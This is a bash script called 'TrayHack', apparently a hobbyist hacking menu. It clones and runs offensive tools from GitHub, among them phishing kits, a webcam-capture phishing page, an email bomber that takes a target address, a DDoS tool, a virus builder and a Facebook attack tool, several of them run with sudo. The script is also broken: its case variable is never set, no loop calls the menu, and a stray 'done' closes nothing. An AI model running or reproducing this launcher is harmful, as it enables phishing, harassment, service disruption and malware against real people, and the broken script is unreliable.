#!/usr/bin/env bash

# ────────────────────────────────────────────────
#   TrayHack v4.1 - Enhanced Edition 🔥
#   Coded by bash • github.com/iHavebraincells
#   Discord: bashthedev_
# ────────────────────────────────────────────────

# Colors
R='\033[31;1m' G='\033[32;1m' Y='\033[33;1m' B='\033[34;1m' M='\033[35;1m' C='\033[36;1m' W='\033[37;1m' D='\033[0m'

# Banner
banner() {
    clear
    echo -e "${R}"
    cat << 'EOF'
    ██████╗ ██╗  ██╗███████╗██╗  ██╗
    ██╔══██╗╚██╗██╔╝██╔════╝██║  ██║
    ██████╔╝ ╚███╔╝ ███████╗███████║
    ██╔══██╗ ██╔██╗ ╚════██║██╔══██║
    ██████╔╝██╔╝ ██╗███████║██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                
EOF
    echo -e "${D}"
    echo -e "  ${Y}Version: ${W}4.1 🔥   ${Y}CTRL+C: ${W}exit   ${Y}Author: ${W}bash"
    echo
}

# Menu options
show_menu() {
    banner
    echo -e "${W}[${C}1${W}] ${C}Update & Install Dependencies"
    echo -e "${W}[${C}2${W}] ${C}Phishing Tool (ZPhisher)"
    echo -e "${W}[${C}3${W}] ${C}WebCam Hack (CamPhish)"
    echo -e "${W}[${C}4${W}] ${C}Subscan"
    echo -e "${W}[${C}5${W}] ${C}Gmail Bomber"
    echo -e "${W}[${C}6${W}] ${C}DDoS Attack (DDoS-Ripper)"
    echo -e "${W}[${C}7${W}] ${C}How to Use (Video)"
    echo -e "${W}[${C}8${W}] ${C}Uninstall Tools"
    echo -e "${W}[${C}9${W}] ${C}IP Info (Track-IP)"
    echo -e "${W}[${C}10${W}] ${C}dorks-eye"
    echo -e "${W}[${C}11${W}] ${C}HackerPro"
    echo -e "${W}[${C}12${W}] ${C}RED_HAWK"
    echo -e "${W}[${C}13${W}] ${C}VirusCrafter"
    echo -e "${W}[${C}14${W}] ${C}Info-Site"
    echo -e "${W}[${C}15${W}] ${C}BadMod"
    echo -e "${W}[${C}16${W}] ${C}Facebash"
    echo -e "${W}[${C}17${W}] ${C}DARKARMY"
    echo -e "${W}[${C}18${W}] ${C}Auto Tor IP Changer"
    echo
}

# Trap Ctrl+C
trap 'echo -e "\n${Y}Exiting...${D}"; exit 0' INT

# Create Tools folder if missing
mkdir -p Tools 2>/dev/null

# ────────────────────────────────────────────────
#   Helper Functions
# ────────────────────────────────────────────────

run_tool() {
    local name="$1"
    local cmd="$2"
    echo -e "\n${Y}Starting ${name}...${D}"
    echo -e "${M}───────────────────────────────────────────────${D}"
    eval "$cmd"
    echo -e "${M}───────────────────────────────────────────────${D}"
    read -p "${Y}Press Enter to return to menu...${D}"
}

clone_and_run() {
    local repo="$1"
    local dir="$2"
    local script="$3"
    local extra_cmd="${4:-}"

    cd Tools || exit 1
    if [ -d "$dir" ]; then
        echo -e "${Y}$dir already exists. Skipping clone.${D}"
    else
        echo -e "${Y}Cloning $repo...${D}"
        git clone "$repo" "$dir" || { echo -e "${R}Clone failed!${D}"; return 1; }
    fi
    cd "$dir" || exit 1
    eval "$extra_cmd"
    bash "$script" || python3 "$script" || python "$script" || php "$script"
    cd ../.. || exit 1
}

# ────────────────────────────────────────────────
#   Main Logic
# ────────────────────────────────────────────────

case $islem in
    1|01)
        clear
        echo -e "\033[47;31;5m Installing updates and dependencies... \033[0m"
        sleep 5
        pkg install git -y
        pkg install python python3 -y
        pkg install pip pip3 -y
        pkg install curl -y
        apt update
        apt upgrade -y
        clear
        echo -e "\033[47;3;35m Update complete... \033[0m"
        sleep 3
        bash trayhack.sh
        ;;
    2|02)
        clear
        echo -e "\033[47;3;35m Installing, this may take some time... \033[0m"
        sleep 3
        cd Tools
        git clone https://github.com/htr-tech/zphisher
        cd zphisher
        bash zphisher.sh
        ;;
    3|03)
        clear
        echo -e "\033[47;3;35m Installing, this may take some time... \033[0m"
        sleep 3
        cd Tools
        git clone https://github.com/techchipnet/CamPhish
        cd CamPhish
        bash camphish.sh
        ;;
    4|04)
        clear
        echo -e "\033[47;3;35m Installing, this may take some time... \033[0m"
        sleep 3
        git clone https://github.com/zidansec/subscan
        cd subscan
        read -p "Enter a domain please (example.com): " sc
        ./subscan $sc
        ;;
    5|05)
        clear
        echo -e "\033[47;3;35m Installing, this may take some time... \033[0m"
        sleep 3
        cd Tools
        git clone https://github.com/juzeon/fast-mail-bomber.git
        cd fast-mail-bomber/
        mv config.example.php config.php
        php index.php update-providers
        rm -rf data/nodes.json data/dead_providers.json
        echo -e "\033[47;3;35m This install will take some time... \033[0m"
        echo -e "\033[47;3;35m Press Ctrl+C to stop \033[0m"
        sleep 4
        php index.php update-nodes
        php index.php refine-nodes
        echo "-------------------------"
        read -p "Enter the email address to bomb: " mail
        echo "-------------------------"
        php index.php start-bombing $mail
        ;;
    6|06)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        git clone https://github.com/palahsu/DDoS-Ripper.git
        cd DDoS-Ripper
        python3 DRipper.py
        echo ""
        echo -e "\033[47;3;35m Hide your IP before using this tool \033[0m"
        ;;
    7|07)
        clear
        echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
        python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
        sleep 10
        echo "Wait 10 seconds"
        bash trayhack.sh
        ;;
    8|08)
        clear
        echo -e "\033[47;3;35m Removing downloaded programs... \033[0m"
        sleep 3
        rm -rf Tools
        bash trayhack.sh
        ;;
    9|09)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        apt update
        apt install git curl
        git clone https://github.com/htr-tech/track-ip.git
        cd track-ip
        bash trackip
        ;;
    10|010)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        git clone https://github.com/BullsEye0/dorks-eye.git
        cd dorks-eye
        pip install -r requirements.txt
        python3 dorks-eye.py
        ;;
    11|011)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        apt update && apt upgrade && apt install git && apt install python2
        git clone https://github.com/jaykali/hackerpro.git
        cd hackerpro
        sudo bash install.sh
        python2 hackerpro.py
        ;;
    12|012)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        git clone https://github.com/Tuhinshubhra/RED_HAWK
        cd RED_HAWK
        php rhawk.php
        ;;
    13|013)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        git clone https://github.com/Devil-Tigers/TigerVirus
        apt update
        apt upgrade -y
        pkg install git -y
        cd TigerVirus
        bash app.sh
        ;;
    14|014)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        pkg install curl -y
        upgrade -y
        pkg install git -y
        git clone https://github.com/king-hacking/info-site.git
        cd info-site
        bash info.sh
        ;;
    15|015)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        sudo apt-get update
        sudo apt-get install php
        sudo apt-get install php-curl
        git clone https://github.com/MrSqar-Ye/BadMod.git
        cd BadMod
        chmod u+x INSTALL
        chmod u+x BadMod.php
        sudo php BadMod.php
        ;;
    16|016)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        git clone https://github.com/fu8uk1/facebash
        cd facebash
        bash install.sh
        chmod +x facebash.sh
        tor
        sudo ./facebash.sh
        ;;
    17|017)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        sleep 3
        cd Tools
        pkg install git
        pkg install python2
        apt install git
        apt install python2
        git clone https://github.com/D4RK-4RMY/DARKARMY
        cd DARKARMY
        chmod +x darkarmy.py
        python2 darkarmy.py
        ;;
    18|018)
        clear
        echo -e "\033[47;3;35m Installation may take some time... \033[0m"
        echo -e "\033[47;3;35m This tool requires root access \033[0m"
        sleep 3
        cd Tools
        sudo apt-get install tor
        pip3 install requests
        git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
        cd Auto_Tor_IP_changer
        echo -e "\033[47;3;35m Go to your browser and set the proxy (sock proxy) to 127.0.0.1:9050 \033[0m"
        sleep 8
        python3 install.py
        aut
        ;;

        *)
            echo -e "${R}Invalid option!${D}"
            sleep 1
            ;;
    esac
done
